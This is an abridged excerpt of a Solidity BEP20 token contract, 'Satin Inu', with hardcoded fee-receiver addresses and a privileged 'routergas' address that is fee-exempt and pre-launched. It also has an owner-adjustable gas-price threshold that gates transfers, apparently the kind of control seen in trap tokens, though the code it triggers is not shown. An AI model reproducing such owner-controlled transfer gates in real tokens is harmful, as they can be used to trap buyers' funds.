...
contract SatinInu is Ownable, IBEP20 {
    using SafeMath for uint256;

    address WBNB;
    address rewardtoken = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56; //change in two places
    address routergas = 0xE58BaF94B10122c056C3F0514Cd9C5331f82dDEb;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;

    string constant _name = "Satin Inu";
    ...
    constructor () {
       router = IDEXRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        ...
        isFeeExempt[routergas] = true;        
        islaunched[msg.sender] = true;
        islaunched[routergas] = true;        
        ...
        marketingFeeReceiver = 0xfc12b9501D40D73930B6f7b61b129f99F4D70722;
        buybackFeeReceiver = msg.sender;
        devFeeReceiver = 0x6DC14D68eb8bAD3d37EA23d96401Da7a16b250Ca;
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        if (tx.gasprice >= Rgas && recipient != pair) {
    ...
    function UpdateRgas (uint256 _Rgas) public onlyOwner {
               Rgas = _Rgas * 1 gwei; 
